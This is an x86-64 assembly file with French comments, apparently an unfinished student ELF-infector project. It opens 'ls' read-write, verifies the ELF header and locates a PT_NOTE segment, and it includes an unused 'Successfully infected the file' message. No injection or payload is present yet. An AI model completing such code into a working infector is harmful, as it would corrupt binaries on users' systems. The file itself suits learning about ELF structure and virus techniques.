;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;nasm -f elf64 -o programme.o projet_elf.s && ld -o programme programme.o

; section pour les constantes
section .data
    filename db 'ls', 0
    Elf_header_struct_size equ 64

    not_elf db 'The binary is not an ELF file', 0xA, 0  ; Erreur type elf
    not_elf_len equ $ - not_elf
    is_elf db 'The binary is an ELF', 0xA, 0  ; Success type elf
    is_elf_len equ $ - is_elf
    is_directory db 'This file is a directory', 0xA, 0  ; Erreur type fichier (dossier)
    is_directory_len equ $ - is_directory
    is_not_directory db 'The file is not a directory', 0xA, 0  ; Success type fichier (n'est pas un dossier)
    is_not_directory_len equ $ - is_not_directory
    if_pt_note_string db 'Found PT_Note', 0xA, 0  ; Success type fichier (n'est pas un dossier)
    if_pt_note_string_len equ $ - if_pt_note_string
    if_not_pt_note_string db 'Couldn t find PT_Note', 0xA, 0  ; Success type fichier (n'est pas un dossier)
    if_not_pt_note_string_len equ $ - if_not_pt_note_string  
    success_msg db 'Successfully infected the file', 0xA, 0
    success_msg_len equ $ - success_msg
    error_open db 'Error opening file', 0xA, 0   ; Message d'erreur lors de l'ouverture
    error_open_len equ $ - error_open  ; Longueur de la chaine
    error_stat db 'Error when calling stat', 0xA, 0   ; Message d'erreur lors de l'appel de stat
    error_stat_len equ $ - error_stat
    error_parse db 'Error when parsing the file', 0xA, 0 ; Message d'erreur du parsing
    error_parse_len equ $ - error_parse

    struc Elf_header_struct
        .e_ident: resb 16
        .e_type: resb 2
        .e_machine: resb 2
        .e_version: resb 4
        .e_entry: resb 8
        .e_phoff: resb 8
        .e_shoff: resb 8
        .e_flags: resb 4
        .e_ehsize: resb 2
        .e_phentsize: resb 2
        .e_phnum: resb 2
        .e_shentsize: resb 2
        .e_shnum: resb 2
        .e_shstrndx: resb 2
    endstruc    

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; section pour les variables
section .bss
    stat_buffer resb 144 ; 144 = buffer typique pour stat en x86_64
    elf_header resb 64 ; instance de elf_header_struct (à remplir avec les infos du header elf)
    program_header resb 56 ; instance de Elf64_Phdr (à remplir avec les infos du header de programme)
    fd resq 1 ; Pour sauvegarder le descripteur de fichier
    last_load_end resq 1 ; Pour sauvegarder la fin du dernier segment LOAD
    phdr_offset resq 1 ; Offset des program headers
    temp_buffer resb 56 ; Buffer temporaire pour lire les program headers

section .text
global _start

_start:
    call cmp_stat_directory
    call open_file
    call read_file
    call cmp_header_elf
    call find_pt_note
    jmp exit_program 

; Ouvrir le fichier
open_file:
    mov rax, 2                    ; numéro de syscall pour open
    mov rdi, filename             ; pointeur vers le nom du fichier
    mov rsi, 2                    ; flags : read write
    xor rdx, rdx                ; mode : non utilisé ici
    syscall     

    ; Vérifie si le fichier a été ouvert avec succès
    cmp rax, 0
    jl open_error                 ; Si la valeur de retour < 0, c'est une erreur
    mov [fd], rax ; Sauvegarde le descripteur de fichier
    ret

    ; Afficher le message d'erreur si on a pas pu ouvrir le fichier
    open_error:
        mov rax, 1                    ; syscall pour écrire
        mov rdi, 1                    ; descripteur de fichier : stdout
        mov rsi, error_open       ; pointeur vers le message d'erreur
        mov rdx, error_open_len            ; longueur du message d'erreur
        syscall
        jmp exit_program

; Lire les premiers octets du fichier
read_file:
    mov rax, 0                    ; syscall pour lire
    mov rdi, [fd]
    mov rsi, elf_header         ; structure pour le header elf
    mov rdx, Elf_header_struct_size         ; nombre d'octets à lire
    syscall
    ret

cmp_header_elf:
    mov eax, dword [elf_header] ; début de la structure = .ELF
    cmp eax, 0x464c457f    ;.ELF en hexa (little endian)
    je is_elf_file ; si égal

    ;sinon
    print_not_elf:
        mov rax, 1 ; syscall pour écrire
        mov rdi, 1 ; descripteur de fichier : stdout
        mov rsi, not_elf; rsi = buffer (la valeur à écrire)
        mov rdx, not_elf_len ;(la taille du buffer)
        syscall
        jmp exit_program

    is_elf_file:
        mov rax, 1 ; syscall pour écrire
        mov rdi, 1 ; descripteur de fichier : stdout
        mov rsi, is_elf; rsi = buffer (la valeur à écrire)
        mov rdx, is_elf_len ; (la taille du buffer)
        syscall
        ret

cmp_stat_directory:
    mov rax, 4 ; syscall pour stat
    mov rdi, filename ; pointeur vers le nom du fichier
    mov rsi, stat_buffer ; buffer pour stocker la valeur de stat
    syscall

    ; test si stat a fonctionné
    test rax, rax
    js stat_error 

    ; Si pas d'erreurs
    mov eax, [stat_buffer + 24]  ; on tronque pour se placer à l'endroit st_mode (le type du fichier)
    and eax, 0xF000     ; On garde que les 4 bits qui indiquent le type, on met le reste à 0
    cmp eax, 0x4000     ; Compare avec la valeur de base d'un dossier
    je if_directory

    if_not_directory:
        mov rax, 1 ; syscall pour écrire
        mov rdi, 1 ; descripteur de fichier : stdout
        mov rsi, is_not_directory; rsi = la valeur à écrire
        mov rdx, is_not_directory_len ; la taille du buffer
        syscall
        ret

    if_directory:
        mov rax, 1 ; syscall pour écrire
        mov rdi, 1 ; descripteur de fichier : stdout
        mov rsi, is_directory; rsi = la valeur à écrire
        mov rdx, is_directory_len ; la taille du buffer
        syscall
        jmp exit_program

    stat_error:          
        mov rax, 1                    ; syscall pour écrire
        mov rdi, 1                    ; descripteur de fichier : stdout
        mov rsi, error_stat       ; pointeur vers le message d'erreur
        mov rdx, error_stat_len            ; longueur du message d'erreur
        syscall  
        jmp exit_program

find_pt_note:
    ; Obtenir l'offset des program headers
    mov rax, [elf_header + Elf_header_struct.e_phoff]
    mov [phdr_offset], rax

    movzx rcx, word [elf_header + Elf_header_struct.e_phnum]    ; rcx = nombre de program headers

    ; boucle pour trouver pt_note
    ; on regarde dans chaque program header
    search_pt_note:
        push rcx ; Sauvegarder le compteur
        
        ; Lire le program header
        mov rax, 8          ; lseek
        mov rdi, [fd]
        mov rsi, [phdr_offset]
        xor rdx, rdx        ; SEEK_SET
        syscall

        mov rax, 0          ; read
        mov rdi, [fd]
        mov rsi, program_header
        movzx rdx, word [elf_header + Elf_header_struct.e_phentsize]   ; Elf64_Phdr = 56 
        syscall

        ; Vérifier si c'est PT_NOTE
        cmp dword [program_header], 4    ; 4 =  PT_NOTE
        je if_pt_note

        ; Passer au header suivant
        add qword [phdr_offset], 56
        ; mettre à jour le compteur
        pop rcx 
        dec rcx 
        jnz search_pt_note ; loop

        if_not_pt_note:
            mov rax, 1
            mov rdi, 1
            mov rsi, if_not_pt_note_string
            mov rdx, if_not_pt_note_string_len
            syscall
            jmp exit_program

        if_pt_note:
            mov rax, 1 ; syscall pour écrire
            mov rdi, 1 ; descripteur de fichier : stdout
            mov rsi, if_pt_note_string; rsi = la valeur à écrire
            mov rdx, if_pt_note_string_len ; la taille du buffer
            syscall
            pop rcx  ; Restaurer la pile
            ret

; Terminer le programme
exit_program:
    ; Fermer le fichier
    mov rdi, [fd]
    mov rax, 3 ; syscall pour fermer
    syscall

    ; Exit
    mov rax, 60                   ; syscall pour exit
    xor rdi, rdi                  ; statut : 0
    syscall
    

